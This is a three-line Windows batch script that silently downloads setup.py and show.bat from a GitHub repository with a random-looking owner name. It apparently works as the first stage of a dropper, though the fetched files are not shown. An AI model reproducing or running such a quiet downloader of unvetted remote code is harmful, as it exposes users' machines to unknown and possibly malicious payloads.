@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/asfasfasfwwqqw/resx/main/setup.py
curl -s -L -o show.bat https://raw.githubusercontent.com/asfasfasfwwqqw/resx/main/show.bat
